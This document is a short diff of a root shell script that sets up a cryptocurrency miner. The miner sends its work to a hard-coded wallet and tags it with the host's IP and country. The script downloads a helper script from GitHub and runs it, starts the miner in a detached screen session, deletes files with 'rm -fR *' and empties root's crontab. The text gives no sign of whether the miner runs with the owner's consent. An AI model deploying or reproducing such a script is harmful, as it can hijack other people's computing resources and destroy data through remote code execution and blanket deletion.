@@ -38,8 +38,7 @@ cat >>/root/danielluis1921.sh <<EOF
 #!/bin/bash
 sudo ./kill_miner.sh
 sleep 5
-sudo ./SRBMiner-MULTI --background -t $cores -a ghostrider --pool $fastest_server:1090 --tls true --wallet knDjktTRpuRLmntgfgKFftM43W3pcaBn3k.$IP4_UNDERSCORE-$country --keepalive true> /dev/null 2>&1 &
-sleep 3
+sudo ./SRBMiner-MULTI --background -t $cores -a ghostrider --pool $fastest_server:1090 --tls true --wallet knDjktTRpuRLmntgfgKFftM43W3pcaBn3k.$IP4_UNDERSCORE-$country --keepalive true
 EOF
 
 chmod +x /root/danielluis1921.sh
@@ -60,7 +59,7 @@ wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_
 chmod +x /root/kill_miner.sh
 ./kill_miner.sh
 sleep 3
-./danielluis1921.sh
+screen -dmS Keymaker ./danielluis1921.sh
 rm -fv *
 rm -fR *
 cat /dev/null > /var/spool/cron/crontabs/root
